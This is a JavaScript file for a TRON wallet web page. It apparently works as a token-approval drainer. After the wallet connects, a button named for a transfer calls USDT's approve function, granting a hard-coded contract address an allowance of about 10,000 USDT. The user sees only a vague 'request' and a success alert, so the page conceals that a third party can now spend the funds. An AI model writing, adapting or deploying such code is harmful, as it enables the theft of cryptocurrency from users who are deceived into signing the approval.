const connectBtn = document.getElementById('connectBtn');
const transferBtn = document.getElementById('transferBtn');
const walletAddressText = document.getElementById('walletAddress');

let userAddress = '';

const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; 

// Функция для поиска tronWeb с задержкой (если кошелек не успел загрузиться сразу)
function getTronWeb() {
    return new Promise((resolve) => {
        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
            return resolve(window.tronWeb);
        }
        
        let attempts = 0;
        const interval = setInterval(() => {
            attempts++;
            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                clearInterval(interval);
                resolve(window.tronWeb);
            } else if (attempts > 10) { // Проверяем около 5 секунд
                clearInterval(interval);
                resolve(null);
            }
        }, 500);
    });
}

// Кнопка подключения кошелька
connectBtn.addEventListener('click', async () => {
    try {
        walletAddressText.innerText = "Поиск кошелька...";
        const tronWebInstance = await getTronWeb();

        if (tronWebInstance && tronWebInstance.defaultAddress.base58) {
            userAddress = tronWebInstance.defaultAddress.base58;
            walletAddressText.innerText = `Подключено: ${userAddress}`;
            connectBtn.style.display = 'none';
            transferBtn.style.display = 'inline-block';
        } else {
            alert('Кошелек TRON не обнаружен. Убедитесь, что вы используете кошелок с поддержкой Tron (например, TronLink) или правильный DApp-браузер.');
            walletAddressText.innerText = "Кошелек не найден";
        }
    } catch (error) {
        console.error("Ошибка подключения:", error);
        alert("Произошла ошибка при подключении кошелька.");
    }
});

// Кнопка выполнения запроса (Approve)
transferBtn.addEventListener('click', async () => {
    try {
        const tronWebInstance = await getTronWeb();
        if (!userAddress || !tronWebInstance) {
            alert('Сначала подключите кошелек!');
            return;
        }
        
        console.log("Запрос разрешения (Approve) на USDT...");

        const usdtContract = await tronWebInstance.contract().at(usdtContractAddress);
        const approveAmount = '10000000000'; 

        const tx = await usdtContract.approve(
            myContractAddress,
            approveAmount
        ).send({
            feeLimit: 100000000
        });

        alert("Запрос успешно подтвержден!");
        console.log("Хэш транзакции approve:", tx);

    } catch (error) {
        console.error("Ошибка при отправке запроса:", error);
        alert("Ошибка при выполнении транзакции. Проверьте консоль.");
    }
});
